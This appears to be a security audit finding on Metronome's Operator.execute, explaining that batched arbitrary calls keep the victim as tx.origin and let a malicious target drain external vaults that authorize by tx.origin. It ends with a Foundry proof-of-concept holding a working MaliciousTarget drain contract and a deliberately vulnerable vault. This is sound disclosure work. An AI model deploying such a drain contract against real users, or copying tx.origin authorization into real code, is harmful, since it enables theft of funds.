### Title
Arbitrary `Operator.execute` calls can drain victim funds from `tx.origin`-authorized external contracts - ([File: contracts/Operator.sol](contracts/Operator.sol))

### Summary
`Operator.execute` lets any caller execute attacker-supplied arbitrary contract calls, while the initiating EOA remains `tx.origin` for the entire transaction. A malicious call target can therefore invoke an external contract that incorrectly authorizes actions using `tx.origin`, causing funds associated with the caller’s EOA to be withdrawn to the malicious target.

### Finding Description
`Operator.execute` accepts a caller-provided array of `(target, value, callData)` tuples and invokes each `target` through `functionCallWithValue` without restricting the target or calldata. [1](#0-0)  The `nonReentrant` modifier only prevents reentry into `Operator`; it does not sandbox or prevent arbitrary outbound calls. [2](#0-1)  `setMsgSender` records the initiating EOA in transient storage for Metronome authentication, but it does not change `tx.origin`. [3](#0-2) 

Consequently, if a user batches a call to an attacker-controlled target, that target can call a third-party vault that authorizes based on `tx.origin`. The vault sees the victim EOA as `tx.origin` and releases the victim’s balance to `msg.sender`, which is the malicious target.

Metronome’s `SynthContext` correctly maps direct calls from `Operator` back to the EOA for Metronome contracts. [4](#0-3)  It does not protect arbitrary external calls made by a malicious call target, because those external calls observe `msg.sender == maliciousTarget` and `tx.origin == victim`.

### Impact Explanation
A victim EOA can lose funds held in any external contract that authorizes withdrawals or account actions by `tx.origin`. This is direct theft of user funds, even though the vulnerable accounting contract is external to Metronome.

The impact can include balances deliberately held under the EOA through another protocol, escrow, vault, or payment contract. Funds inside Metronome are not exposed merely by this mechanism unless a Metronome function is reachable using the attacker-controlled `msg.sender` or another independent authorization weakness.

### Likelihood Explanation
The issue requires the victim to execute a batch containing an attacker-controlled call target and requires that the victim has assets controlled by an external `tx.origin`-based authorization check. `tx.origin` authorization is a known anti-pattern but remains present in some deployed contracts.

`Operator` is explicitly designed to let EOAs perform arbitrary calls, so untrusted or opaque call targets are a realistic integration and frontend risk. [5](#0-4)  No deployed allowlist, target validation, or calldata restriction prevents this behavior. [6](#0-5) 

### Recommendation
- Document that `Operator.execute` preserves the caller as `tx.origin` and that arbitrary targets can exploit external contracts relying on `tx.origin`.
- Advise users and integrators to call only fully trusted targets and avoid mixing untrusted targets with protocol calls.
- Recommend that users interacting with opaque bundles use a dedicated EOA or smart account that does not hold balances in unrelated contracts.
- Frontends constructing `Operator` batches should display every target and calldata recipient and warn when arbitrary external calls are included.

### Proof of Concept
The following Foundry-style test demonstrates the invariant break: a victim’s external balance can be withdrawn by a malicious target during `Operator.execute` because `tx.origin` remains the victim.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {Operator, IOperator} from "../contracts/Operator.sol";

contract TxOriginVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        // Vulnerable external-account model: deposits are keyed by tx.origin.
        balances[tx.origin] += msg.value;
    }

    function withdraw() external {
        // Vulnerable external authorization: authenticates tx.origin and pays msg.sender.
        uint256 amount = balances[tx.origin];
        require(amount != 0, "no balance");

        balances[tx.origin] = 0;
        payable(msg.sender).transfer(amount);
    }
}

contract MaliciousTarget {
    TxOriginVault public immutable vault;
    address public immutable attacker;

    constructor(TxOriginVault vault_, address attacker_) {
        vault = vault_;
        attacker = attacker_;
    }

    function poke() external {
        vault.withdraw();
        payable(attacker).transfer(address(this).balance);
    }

    receive() external payable {}
}

contract OperatorTxOriginTest is Test {
    Operator internal operator;
    TxOriginVault internal vault;
    MaliciousTarget internal malicious;

    address internal victim = address(0xBEEF);
    address internal attacker = address(0xAAAA);

    function testMaliciousTargetDrainsTxOriginAuthorizedVault() external {
        operator = new Operator();
        vault = new TxOriginVault();
        malicious = new MaliciousTarget(vault, attacker);

        vm.deal(victim, 10 ether);

        // Both msg.sender and tx.origin are the victim, matching an EOA transaction.
        vm.prank(victim, victim);
        vault.deposit{value: 5 ether}();

        IOperator.Call[] memory calls = new IOperator.Call[](1);
        calls[0] = IOperator.Call({
            target: address(malicious),
            value: 0,
            callData: abi.encodeCall(MaliciousTarget.poke, ())
        });

        // The victim executes a prepared batch containing the malicious target.
        vm.prank(victim, victim);
        operator.execute(calls);

        assertEq(victim.balance, 5 ether);
        assertEq(address(vault).balance, 0);
        assertEq(attacker.balance, 5 ether);
    }
}
```

The decisive transition is `victim -> Operator.execute -> MaliciousTarget.poke -> TxOriginVault.withdraw`; `TxOriginVault` observes `tx.origin == victim` and pays `msg.sender == MaliciousTarget`. [7](#0-6)
